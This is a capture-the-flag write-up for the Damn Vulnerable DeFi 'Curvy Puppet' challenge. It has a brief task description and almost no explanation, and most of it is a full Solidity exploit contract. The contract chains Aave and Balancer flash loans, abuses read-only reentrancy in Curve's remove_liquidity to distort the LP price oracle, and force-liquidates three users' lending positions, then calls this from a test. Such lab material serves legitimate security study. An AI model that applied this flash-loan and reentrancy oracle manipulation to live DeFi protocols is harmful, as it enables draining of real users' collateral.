# Curvy Puppet

There's a lending contract where anyone can borrow LP tokens from Curve's stETH/ETH pool. To do so, borrowers must first deposit enough Damn Valuable tokens (DVT) as collateral. If a position's borrowed value grows larger than the collateral's value, anyone can liquidate it by repaying the debt and seizing all collateral.

The lending contract integrates with [Permit2](https://github.com/Uniswap/permit2) to securely manage token approvals. It also uses a permissioned price oracle to fetch the current prices of ETH and DVT.

Alice, Bob and Charlie have opened positions in the lending contract. To be extra safe, they decided to really overcollateralize them.

But are they really safe? That's not what's claimed in the urgent bug report the devs received.

Before user funds are taken, close all positions and save all available collateral.

The devs have offered part of their treasury in case you need it for the operation: 200 WETH and a little over 6 LP tokens. Don't worry about profits, but don't use all their funds. Also, make sure to transfer any rescued assets to the treasury account.

_NOTE: this challenge requires a valid RPC URL to fork mainnet state into your local environment._

## Solution 
This pool is effected with read only reentrancy and I am also a beginner. So, I think I can't explain but I will try to update the explanation later. But who are here to learn exploit rather than copying POC, I have some management for you guys. Just click [here](https://defihacklabs.substack.com/p/damn-vulnerable-defi-v4-writeup)

## POC
```solidity
interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}
interface IBalancerVault {

    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;

}

contract Exploit {
    IStableSwap public curvePool;
    CurvyPuppetLending public lending;
    IERC20 public curveLpToken;
    address public player;
    uint256 public treasuryLpBalance;
    IERC20 stETH;
    WETH weth;
    address treasury;
    DamnValuableToken dvt;
        IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
        IAaveFlashloan AaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
        IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    constructor(
        IStableSwap _curvePool,
        CurvyPuppetLending _lending,
        IERC20 _curveLpToken,
        address _player,
        uint256 _treasuryLpBalance,
        IERC20 _stETH,
        WETH _weth,
        address _treasury,
        DamnValuableToken _dvt

    ) {
        curvePool = _curvePool;
        lending = _lending;
        curveLpToken = _curveLpToken;
        player = _player;
        treasuryLpBalance = _treasuryLpBalance;
        stETH = _stETH;
        weth = _weth;
        treasury = _treasury;
        dvt = _dvt;
    }

    function manipulateCurvePool() public {
        // Step 1: Add liquidity to the Curve pool
        weth.withdraw(58685 ether);

        console.log("LP token price before removing liquidity:", curvePool.get_virtual_price());
        // To call the exchange function of the Curve Pool to swap ETH for stETH.
        stETH.approve(address(curvePool),type(uint256).max);

        uint256[2] memory amount;
        amount[0] = 58685 ether;
        amount[1] = stETH.balanceOf(address(this));
        console.log("my weth balance",weth.balanceOf(address(this)));
        console.log("my eth balance",address(this).balance);
        curvePool.add_liquidity{value: 58685 ether}(amount, 0);

        uint256 virtualPrice = curvePool.get_virtual_price();

        console.log("LP token price after add liquidity:", virtualPrice);

        
    }

    function removeLiquidity() public {
        // Step 2: Remove liquidity from the Curve pool
        uint256[2] memory min_amounts = [uint256(0), uint256(0)];
        uint256 lpBalance = curveLpToken.balanceOf(address(this));

        curvePool.remove_liquidity(lpBalance - 3000000000000000001, min_amounts);  // Removing liquidity

        console.log("LP token price after2 removing liquidity:", curvePool.get_virtual_price());
    }

    function executeExploit() public {
        //weth.withdraw(200 ether);    
        // Allow lending contract to pull collateral
        IERC20(curvePool.lp_token()).approve(address(permit2), type(uint256).max);
 
        permit2.approve({
            token: curvePool.lp_token(),
            spender: address(lending),
            amount: 5e18,
            expiration: uint48(block.timestamp)
        });
        stETH.approve(address(AaveV2), type(uint256).max);
        weth.approve(address(AaveV2), type(uint256).max);

        address[] memory assets = new address[](2);
        assets[0] = address(stETH);
        assets[1] = address(weth);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 172000 * 1e18;
        amounts[1] = 20500 * 1e18;
        uint256[] memory modes = new uint256[](2);
        modes[0] = 0;
        modes[1] = 0;
 
        AaveV2.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
        weth.transfer(treasury,weth.balanceOf(address(this)));
        curveLpToken.transfer(treasury,1);
        dvt.transfer(treasury,7500e18);


    }
    function executeOperation(
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory premiums,
        address initiator,
        bytes memory params
    ) external returns (bool) {
        console.log("AAVE flashloan stETH balance:",stETH.balanceOf(address(this)));
        console.log(" wETH balancer:",weth.balanceOf(address(Balancer)));      
        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 37991 ether;
        bytes memory userData = "";
        Balancer.flashLoan(address(this), tokens, amounts, userData);
        return true;
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        manipulateCurvePool();
        removeLiquidity();

        weth.deposit{value: 37991 ether}();
        weth.transfer(address(Balancer), 37991 ether);

        uint256 ethAmount = 12963923469069977697655;
        uint256 min_dy = 1; 
        curvePool.exchange{value: ethAmount}(0, 1, ethAmount, min_dy);
        weth.deposit{value: 20518 ether}();
            console.log(" stETH balance2:",stETH.balanceOf(address(this)));
            console.log(" wETH balance2:",weth.balanceOf(address(this)));         
            console.log(" ETH balance2:",(address(this).balance));
            console.log(" my LP balance2:", curveLpToken.balanceOf(address(this)));
        
         


    }
    // Receive function to handle ETH
    receive() external payable {
         if (msg.sender == address(curvePool)) {
            console.log("LP token price during removing liquidity:", curvePool.get_virtual_price());
        address[3] memory users = [
            0x328809Bc894f92807417D2dAD6b7C998c1aFdac6,  // Alice
            0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e,  // Bob
            0xea475d60c118d7058beF4bDd9c32bA51139a74e0   // Charlie
        ];
        console.log("msg.sender",address(this));
        for (uint256 i = 0; i < users.length; i++) {
            lending.liquidate(users[i]);
            console.log("Liquidated user:", users[i]);
        }

         }
    }
}
```
And now just call it on your function 
```solidity
    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_curvyPuppet() public checkSolvedByPlayer {
        IERC20 curveLpToken = IERC20(curvePool.lp_token());

        Exploit exploit = new Exploit(curvePool, lending, curveLpToken, address(player), TREASURY_LP_BALANCE,stETH,weth,address(treasury),dvt);
        // Transfer LP tokens and WETH to the exploit contract
        curveLpToken.transferFrom(address(treasury), address(exploit), TREASURY_LP_BALANCE);
        weth.transferFrom(address(treasury), address(exploit), TREASURY_WETH_BALANCE);
        
        exploit.executeExploit();
    }
```

>Okay! This Much 

### If you found this write up useful give a star to the **[repo](https://github.com/0xscarfac3/damnvulnerabledefi-v4-solutions)** and don't forget to follow your buddy **[0xscarfac3](https://github.com/0xscarfac3)**